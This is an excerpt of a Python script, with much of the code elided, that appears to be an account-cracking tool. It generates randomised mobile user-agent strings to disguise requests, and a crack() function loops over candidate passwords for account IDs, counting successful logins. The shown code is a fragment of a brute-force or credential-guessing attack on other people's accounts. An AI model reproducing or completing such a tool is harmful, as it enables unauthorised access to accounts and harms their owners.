...
for xd in range(10000):
	...
	b=random.choice(['8.1.0'])
	c=random.choice(['en-US; vivo 1820 Build/O11019'])
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(80,106)
	f='0'
	g=random.randrange(3904,5000)
	h=random.randrange(40,100)
	i='UCBrowser/13.4.0.1306 Mobile Safari/537.36 OPR/65.2.2254.63594'
...
def crack(idf,pwv):
	...
	for pw in pwv:
		...
		#		os.popen('play-audio data/cp.mp3')
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36,Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; vivo 1820 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4248.64 UCBrowser/13.4.0.1306 Mobile Safari/537.36 OPR/65.2.2254.63594"}
				if 'no' in taplikasi:
					ok+=1
